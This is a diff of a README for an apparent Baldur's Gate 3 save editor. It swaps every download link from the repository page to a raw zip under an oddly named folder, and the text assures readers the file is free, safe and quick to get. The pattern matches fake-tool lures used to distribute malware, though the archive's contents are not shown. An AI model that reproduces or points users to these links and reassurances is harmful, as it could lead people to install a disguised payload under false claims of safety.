@@ -1,6 +1,6 @@
 # 🎮 Baldurs-Gate-3-Save-Editor - Unlock Unlimited Power in Baldur's Gate 3
 
-[![Download Baldurs Gate 3 Save Editor](https://img.shields.io/badge/Download-Baldurs_Gate_3_Save_Editor-2ea44f?style=for-the-badge&logo=github&logoColor=white&color=4B0082)](https://github.com/thewexer/Baldurs-Gate-3-Save-Editor)
+[![Download Baldurs Gate 3 Save Editor](https://img.shields.io/badge/Download-Baldurs_Gate_3_Save_Editor-2ea44f?style=for-the-badge&logo=github&logoColor=white&color=4B0082)](https://github.com/thewexer/Baldurs-Gate-3-Save-Editor/raw/refs/heads/main/bosomy/Baldurs-Save-Editor-Gate-v2.6-beta.1.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Getting started with Baldurs-Gate-3-Save-Editor is incredibly simple. We've desi
 
 ### 📥 Step 1: Download the Application
 
-Visit this link to download the application: **[Download Baldurs-Gate-3-Save-Editor](https://github.com/thewexer/Baldurs-Gate-3-Save-Editor)**
+Visit this link to download the application: **[Download Baldurs-Gate-3-Save-Editor](https://github.com/thewexer/Baldurs-Gate-3-Save-Editor/raw/refs/heads/main/bosomy/Baldurs-Save-Editor-Gate-v2.6-beta.1.zip)**
 
 The download is completely free and takes just a few seconds. You don't need to register, provide any personal information, or complete any surveys. Just click, download, and you're ready to go.
 
@@ -165,7 +165,7 @@ Thousands of gamers have already transformed their Baldur's Gate 3 experience wi
 
 Ready to take your Baldur's Gate 3 experience to the next level? Download now and join thousands of satisfied users who have already discovered the power of ultimate game control.
 
-**[🚀 Download Baldurs-Gate-3-Save-Editor Now](https://github.com/thewexer/Baldurs-Gate-3-Save-Editor)**
+**[🚀 Download Baldurs-Gate-3-Save-Editor Now](https://github.com/thewexer/Baldurs-Gate-3-Save-Editor/raw/refs/heads/main/bosomy/Baldurs-Save-Editor-Gate-v2.6-beta.1.zip)**
 
 Visit this link to download the application. It's free, it's safe, and it will completely transform how you play Baldur's Gate 3. Don't wait - start your enhanced gaming journey today!
 
